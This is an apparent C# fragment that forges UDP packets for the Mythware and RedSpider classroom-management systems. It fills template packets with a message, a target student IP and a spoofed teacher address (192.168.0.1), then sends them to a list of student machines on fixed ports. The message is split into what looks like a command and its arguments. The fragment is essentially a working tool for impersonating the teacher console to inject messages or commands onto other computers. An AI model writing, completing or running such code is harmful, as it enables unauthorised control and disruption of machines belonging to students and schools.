        public static byte[] BuildPack(string msg)
        {
            ArrayList msgPack = new ArrayList();
            foreach (char ch in msg)
            {
                string tmp = "0x" + Convert.ToInt32(ch).ToString("X");
                int high, low;
                if (Convert.ToInt32(tmp, 16) > 0xff)
                {
                    tmp = tmp.Substring(2);
                    high = Convert.ToInt32(tmp.Substring(0, 2), 16);
                    low = Convert.ToInt32(tmp.Substring(2, 2), 16);
                }
                else
                {
                    high = 0;
                    low = Convert.ToInt32(tmp.Substring(2, 2), 16);
                }
                msgPack.Add(low);
                msgPack.Add(high);
            }
            byte[] result = mythwarePack;
            for (int i = 0; i <= 3; i++)
            {
                mythwarePack[i] = Convert.ToByte(new Random().Next(20, 80));
            }
            int num = 578;
            foreach (int elem in msgPack)
            {
                result[num] = Convert.ToByte(elem);
                num += 1;
            }
            return result;
        }

        public static byte[][] BuildPack(string msg, string studentIp, string teacherIp)
        {
            byte[] result = redSpiderPack;
            byte[] result2 = redSpiderPack2;
            int num = 20;
            foreach (string str in studentIp.Split('.'))
            {
                result[num] = Convert.ToByte(str);
                num++;
            }
            num = 16;
            foreach (string str in teacherIp.Split('.'))
            {
                result2[num] = Convert.ToByte(str);
                num++;
            }
            num = 48;
            foreach (char ch in msg.Split(' ')[0])
            {
                result2[num] = Convert.ToByte(ch);
                num += 2;
            }
            num = 568;
            foreach (char ch in msg.Replace(msg.Split(' ')[0] + " ", ""))
            {
                result2[num] = Convert.ToByte(ch);
                num += 2;
            }
            return new byte[][] { result, result2 };
        }

        public static void SendPack(string msg, string[] ips, int port, RoomType roomType)
        {
            if (roomType == RoomType.Mythware)
            {
                byte[] pack = BuildPack(msg);
                Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                foreach (string ip in ips)
                {
                    server.SendTo(pack, new IPEndPoint(IPAddress.Parse(ip), port));
                    Thread.Sleep(750);
                }
                server.Close();
            }
            else
            {
                foreach (string ip in ips)
                {
                    byte[][] packs = BuildPack(msg, ip, "192.168.0.1");
                    byte[] pack = packs[0];
                    byte[] pack2 = packs[1];
                    UdpClient server = new UdpClient();
                    server.Send(pack, pack.Length, new IPEndPoint(IPAddress.Parse(ip), 1689));
                    Thread.Sleep(500);
                    UdpClient server2 = new UdpClient();
                    server2.Send(pack2, pack2.Length, new IPEndPoint(IPAddress.Parse(ip), 1689));
                    server2.Close();
                    Thread.Sleep(750);
                }
            }
        }

        public enum RoomType
        {
            Mythware = 1,
            RedSpider = 2
        }
